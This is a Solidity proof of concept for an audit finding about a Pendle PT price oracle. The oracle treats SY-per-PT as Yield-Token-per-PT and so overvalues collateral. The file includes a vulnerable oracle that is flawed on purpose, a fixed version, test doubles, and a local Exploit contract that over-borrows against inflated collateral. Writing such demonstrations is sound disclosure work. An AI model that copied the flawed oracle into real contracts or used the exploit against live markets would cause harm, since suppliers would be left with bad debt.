// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// =============================================================================
//  Notional Exponent H-8 — PendlePTOracle assumes 1 SY == 1 Yield Token
//  (sherlock 2025-06-notional-exponent, src/oracles/PendlePTOracle.sol L61-89).
//
//  With `useSyOracleRate = true`, `_getPTRate()` returns `getPtToSyRate` — the
//  number of Pendle SY tokens per PT. `_calculateBaseToQuote()` then multiplies
//  that by `baseToUSD`, the Chainlink USD price of the *Yield Token* (the only
//  feed that exists — no feed prices SY directly). This is only correct if
//  1 SY == 1 Yield Token. It is NOT: SY.redeem can lose value to slippage/fees,
//  so 1 SY < 1 Yield Token. Using SY-per-PT as if it were YieldToken-per-PT
//  INFLATES the PT price → PT collateral is overvalued → borrowers can borrow
//  more than their collateral is truly worth → bad debt / insolvency.
//
//  `_getPTRate` and `_calculateBaseToQuote` are reproduced VERBATIM (marked @>);
//  the Pendle oracle, Chainlink feed, PT/asset tokens and a minimal collateral
//  market are faithful minimal doubles. Local deploy, no fork.
// =============================================================================

contract MiniToken {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _symbol) {
        symbol = _symbol;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

// Combined Pendle oracle + Chainlink feed double.
contract Oracles {
    // Pendle: rates are 1e18-scaled.
    uint256 public immutable ptToSyRate; // SY per PT   (used when useSyOracleRate)
    uint256 public immutable ptToAssetRate; // asset per PT (the correct rate)
    // Chainlink: USD price of the Yield Token / asset, 8 decimals.
    int256 public immutable baseToUSD;

    constructor(uint256 _ptToSy, uint256 _ptToAsset, int256 _baseToUSD) {
        ptToSyRate = _ptToSy;
        ptToAssetRate = _ptToAsset;
        baseToUSD = _baseToUSD;
    }

    function getPtToSyRate(address, /*market*/ uint32 /*twap*/ ) external view returns (uint256) {
        return ptToSyRate;
    }

    function getPtToAssetRate(address, /*market*/ uint32 /*twap*/ ) external view returns (uint256) {
        return ptToAssetRate;
    }

    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)
    {
        return (1, baseToUSD, block.timestamp, block.timestamp, 1);
    }
}

/*//////////////////////////////////////////////////////////////
   PendlePTOracle — VULNERABLE. Prices PT as (SY-per-PT) x (USD-per-YieldToken),
   assuming 1 SY == 1 Yield Token.
//////////////////////////////////////////////////////////////*/
contract PendlePTOracle {
    Oracles public immutable PENDLE_ORACLE;
    Oracles public immutable baseToUSDOracle;
    address public immutable pendleMarket;
    uint32 public immutable twapDuration;
    bool public immutable useSyOracleRate;
    int256 public constant baseToUSDDecimals = 1e8;

    constructor(Oracles _pendle, Oracles _base, address _market, uint32 _twap, bool _useSy) {
        PENDLE_ORACLE = _pendle;
        baseToUSDOracle = _base;
        pendleMarket = _market;
        twapDuration = _twap;
        useSyOracleRate = _useSy;
    }

    function _getPTRate() internal view returns (int256) {
        uint256 ptRate = useSyOracleRate
            ? PENDLE_ORACLE.getPtToSyRate(pendleMarket, twapDuration) // @> SY-per-PT used as if YieldToken-per-PT
            : PENDLE_ORACLE.getPtToAssetRate(pendleMarket, twapDuration);
        return int256(ptRate);
    }

    function _calculateBaseToQuote() internal view returns (int256 answer) {
        (, int256 baseToUSD,,,) = baseToUSDOracle.latestRoundData();
        require(baseToUSD > 0, "Chainlink Rate Error");
        int256 ptRate = _getPTRate();
        // @> answer treats SY-per-PT as YieldToken-per-PT → inflated when 1 SY < 1 YieldToken
        answer = (ptRate * baseToUSD) / baseToUSDDecimals;
    }

    function latestAnswer() external view returns (int256) {
        return _calculateBaseToQuote();
    }
}

/*//////////////////////////////////////////////////////////////
   PendlePTOracleFixed — mitigation: do not assume 1 SY == 1 Yield
   Token. Use getPtToAssetRate (asset-per-PT) directly, which
   reflects the real SY->asset redemption value.
//////////////////////////////////////////////////////////////*/
contract PendlePTOracleFixed {
    Oracles public immutable PENDLE_ORACLE;
    Oracles public immutable baseToUSDOracle;
    address public immutable pendleMarket;
    uint32 public immutable twapDuration;
    int256 public constant baseToUSDDecimals = 1e8;

    constructor(Oracles _pendle, Oracles _base, address _market, uint32 _twap) {
        PENDLE_ORACLE = _pendle;
        baseToUSDOracle = _base;
        pendleMarket = _market;
        twapDuration = _twap;
    }

    function latestAnswer() external view returns (int256 answer) {
        (, int256 baseToUSD,,,) = baseToUSDOracle.latestRoundData();
        require(baseToUSD > 0, "Chainlink Rate Error");
        int256 ptRate = int256(PENDLE_ORACLE.getPtToAssetRate(pendleMarket, twapDuration)); // asset-per-PT
        answer = (ptRate * baseToUSD) / baseToUSDDecimals;
    }
}

// Minimal collateral market: borrow asset up to the oracle value of posted PT.
contract CollateralMarket {
    MiniToken public immutable pt;
    MiniToken public immutable asset;
    PendlePTOracle public immutable oracle;
    mapping(address => uint256) public collateralPt;
    mapping(address => uint256) public debt;

    constructor(MiniToken _pt, MiniToken _asset, PendlePTOracle _oracle) {
        pt = _pt;
        asset = _asset;
        oracle = _oracle;
    }

    // USD (== asset units, asset is $1) value of `ptAmount` PT per the oracle.
    function ptValue(uint256 ptAmount) public view returns (uint256) {
        return (ptAmount * uint256(oracle.latestAnswer())) / 1e18;
    }

    // Caller must have transferred `ptAmount` PT to this market first.
    function deposit(uint256 ptAmount) external {
        collateralPt[msg.sender] += ptAmount;
    }

    function borrow(uint256 amount) external {
        require(debt[msg.sender] + amount <= ptValue(collateralPt[msg.sender]), "undercollateralized");
        debt[msg.sender] += amount;
        asset.transfer(msg.sender, amount);
    }
}

/*//////////////////////////////////////////////////////////////
   Exploit — the inflated PendlePTOracle lets a borrower draw more
   asset than the PT collateral is truly worth; the shortfall is
   bad debt the suppliers absorb.
//////////////////////////////////////////////////////////////*/
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d; // bad-debt sink

    // 1 SY = 0.8 asset → 1.25 SY per PT to equal 1 asset per PT. Oracle inflates 25%.
    uint256 internal constant PT_TO_SY = 1.25e18; // getPtToSyRate  (SY per PT)
    uint256 internal constant PT_TO_ASSET = 1e18; // getPtToAssetRate (asset per PT, true)
    int256 internal constant BASE_TO_USD = 1e8; // asset = $1 (Chainlink 8dp)
    uint256 internal constant PT_COLLATERAL = 1000 ether;

    MiniToken public asset;
    MiniToken public pt;
    Oracles public oracles;
    PendlePTOracle public ptOracle;
    CollateralMarket public market;
    MiniToken public badDebt;

    uint256 public buggyLimit; // asset borrowable under the inflated oracle
    uint256 public trueValue; // asset the PT is really worth

    function run() external payable {
        asset = new MiniToken("asset");
        pt = new MiniToken("PT");
        oracles = new Oracles(PT_TO_SY, PT_TO_ASSET, BASE_TO_USD);
        ptOracle = new PendlePTOracle(oracles, oracles, address(0xBEEF), 900, true); // useSyOracleRate = true
        market = new CollateralMarket(pt, asset, ptOracle);
        badDebt = new MiniToken("BAD-DEBT");

        // Suppliers fund the market with asset liquidity.
        asset.mint(address(market), 2000 ether);

        // Borrower posts 1000 PT (truly worth 1000 asset) as collateral.
        pt.mint(address(this), PT_COLLATERAL);
        pt.transfer(address(market), PT_COLLATERAL);
        market.deposit(PT_COLLATERAL);

        // The inflated oracle values the PT at 1.25x, so the borrower can draw 1250.
        buggyLimit = market.ptValue(PT_COLLATERAL); // 1250 asset
        trueValue = (PT_COLLATERAL * PT_TO_ASSET) / 1e18; // 1000 asset

        market.borrow(buggyLimit);

        // The shortfall (250) is unbacked bad debt the suppliers eat.
        badDebt.mint(SINK, buggyLimit - trueValue);
    }
}
